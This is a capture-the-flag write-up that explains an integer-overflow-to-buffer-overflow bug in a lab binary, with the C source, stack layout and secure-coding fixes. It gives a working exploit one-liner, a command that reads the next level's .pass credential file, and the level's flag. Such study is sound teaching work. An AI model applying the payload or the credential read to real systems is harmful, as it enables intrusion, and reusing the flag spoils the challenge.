# Bonus1 - Integer Overflow Exploitation

## Vulnerability Type
**Integer Overflow** leading to buffer overflow

## Quick Solution

```bash
./bonus1 -2147483637 $(python -c "print 'A'*40 + '\x46\x4c\x4f\x57'")
cat /home/user/bonus2/.pass
```

## The Vulnerability

### Code Analysis

```c
int main(int argc, char **argv) {
    char buffer[40];
    int num;
    
    num = atoi(argv[1]);
    
    if (num > 9) {          // Check passes if num <= 9
        return 1;
    }
    
    memcpy(buffer, argv[2], num << 2);  // Copies (num * 4) bytes
    
    if (num == 0x574f4c46) {  // Magic value check
        execl("/bin/sh", "sh", NULL);
    }
    
    return 0;
}
```

### The Problem

1. `num` is checked against 9 using **signed comparison**
2. `num << 2` (multiply by 4) can cause **integer overflow**
3. Negative numbers pass the `> 9` check
4. When shifted, negative numbers can become large positive values
5. This allows copying more bytes than intended → **buffer overflow**

## Integer Overflow Explained

### Signed vs Unsigned

```c
int num = -2147483637;  // 0x8000000B in hex

// Signed comparison
if (num > 9)  // FALSE (-2147483637 is less than 9)

// Shift operation (treats as unsigned for size)
num << 2  // 0x8000000B << 2 = 0x0000002C = 44 bytes
```

### The Magic Number

We need: `-2147483637`

**Why?**
- In hex: `0x8000000B`
- When shifted left by 2: `0x0000002C` (44 decimal)
- 44 bytes is enough to overflow buffer and overwrite `num`

## Memory Layout

### Stack Structure

```
Lower addresses
┌─────────────────────────────────┐
│ buffer[40]                      │ ← Destination for memcpy
├─────────────────────────────────┤
│ num (4 bytes)                   │ ← Gets overwritten!
├─────────────────────────────────┤
│ Saved EBP                       │
├─────────────────────────────────┤
│ Return address                  │
└─────────────────────────────────┘
Higher addresses
```

### Overflow Mechanism

```
memcpy(buffer, argv[2], 44) copies:
- 40 bytes to buffer
- 4 bytes to num ← Overwrites with 0x574f4c46!
```

## Exploitation Strategy

### Step 1: Calculate the Magic Number

We need `num` such that:
1. `num <= 9` (passes the check)
2. `num << 2 >= 44` (enough to overflow)
3. After overflow, `num == 0x574f4c46`

**Solution**: `-2147483637`
- Binary: `10000000 00000000 00000000 00001011`
- Shifted: `00000000 00000000 00000000 00101100` = 44

### Step 2: Craft Payload

```python
payload = 'A' * 40 + '\x46\x4c\x4f\x57'
```

**Structure**:
- 40 bytes of padding (fills buffer)
- 4 bytes: `0x574f4c46` (little-endian: `\x46\x4c\x4f\x57`)

### Step 3: Execute

```bash
./bonus1 -2147483637 $(python -c "print 'A'*40 + '\x46\x4c\x4f\x57'")
```

## Execution Flow

```
1. num = atoi("-2147483637") = -2147483637 (0x8000000B)
2. if (num > 9) → FALSE (passes check)
3. memcpy(buffer, payload, -2147483637 << 2)
   → memcpy(buffer, payload, 44)
4. Copies:
   - buffer[0-39] = 'A' * 40
   - num = 0x574f4c46 (overwritten!)
5. if (num == 0x574f4c46) → TRUE
6. execl("/bin/sh", "sh", NULL)
7. Shell spawned as bonus2 user!
```

## The Magic Value: 0x574f4c46

```
0x574f4c46 in ASCII:
0x57 = 'W'
0x4f = 'O'
0x4c = 'L'
0x46 = 'F'

Reading backwards (little-endian): "FLOW"
```

This is likely a hint from the challenge creator!

## Why This Works

| Protection | Status | Impact |
|------------|--------|--------|
| NX (DEP) | Disabled | Not needed (execl used) |
| ASLR | Disabled | Predictable addresses |
| Stack Canary | None | No overflow detection |
| Integer Overflow Check | None | Vulnerable! |

## Key Concepts

### Integer Overflow

```c
// Signed integer overflow
int x = 2147483647;  // INT_MAX
x = x + 1;           // Wraps to -2147483648 (INT_MIN)

// Left shift overflow
int y = -2147483637;  // 0x8000000B
y << 2;               // 0x0000002C (44)
```

### Signed vs Unsigned Comparison

```c
int num = -1;
if (num > 9)          // FALSE (signed comparison)
unsigned int size = num << 2;  // Large positive value!
```

## Security Lessons

1. **Always validate integer operations**:
   ```c
   if (num > 9 || num < 0) return 1;  // Check both bounds!
   ```

2. **Use size_t for sizes**:
   ```c
   size_t size = (size_t)num << 2;
   if (size > sizeof(buffer)) return 1;
   ```

3. **Check for overflow before operation**:
   ```c
   if (num > SIZE_MAX / 4) return 1;  // Prevent overflow
   size_t size = num * 4;
   ```

4. **Use safe functions**:
   ```c
   // Instead of memcpy with user-controlled size
   if (size <= sizeof(buffer)) {
       memcpy(buffer, src, size);
   }
   ```

## Flag

```
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

